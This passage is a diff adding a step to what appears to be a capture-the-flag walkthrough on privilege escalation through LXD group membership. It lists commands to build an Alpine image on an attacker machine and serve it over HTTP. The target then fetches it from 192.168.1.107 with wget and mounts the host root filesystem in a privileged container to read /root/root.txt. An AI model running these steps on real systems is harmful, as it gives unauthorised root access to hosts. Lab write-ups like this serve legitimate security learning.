@@ -65,3 +65,46 @@ this is ford privet key
  its `lxd` ,so i have to create an image for lxd thus you need to perform the following the action
 
 ![Screenshot from 2021-04-13 16-49-27](https://user-images.githubusercontent.com/34393428/114632784-a96b4c00-9cbf-11eb-925f-841d5c7522ae.png)
+
+
+#### lxd
+```
+XD is a next generation system container manager. It offers a user experience similar to virtual machines but using Linux containers instead.
+
+It's image based with pre-made images available for a wide number of Linux distributions and is built around a very powerful, yet pretty simple, REST API.
+
+To get a better idea of what LXD is and what it does, you can try it online! Then if you want to run it locally, take a look at our getting started guide.
+
+The LXD project was founded and is currently led by Canonical Ltd with contributions from a range of other companies and individual contributors.
+```
+i found an exploit for `lxd` 
+so lets try it 
+#### steps 
+
+<b> on attacker machcine </b>  :
+```
+1- git clone  https://github.com/saghul/lxd-alpine-builder.git
+2- cd lxd-alpine-builder
+3- ./build-alpine
+```
+on running the above command, a tar.gz file is created
+open python server to allow to target machine to download it 
+`4-python -m SimpleHTTPServer`
+
+
+<b> target machine </b> 
+
+``` 
+1-cd /tmp
+2-wget http://192.168.1.107:8000/apline-v3.10-x86_64-20191008_1227.tar.gz
+```
+```
+1-lxc image import ./apline-v3.10-x86_64-20191008_1227.tar.gz --alias myimage
+
+2-lxc init myimage ignite -c security.privileged=true
+3-lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
+4-lxc start ignite
+5-lxc exec ignite /bin/sh
+6-id
+cat /root/root.txt
+```
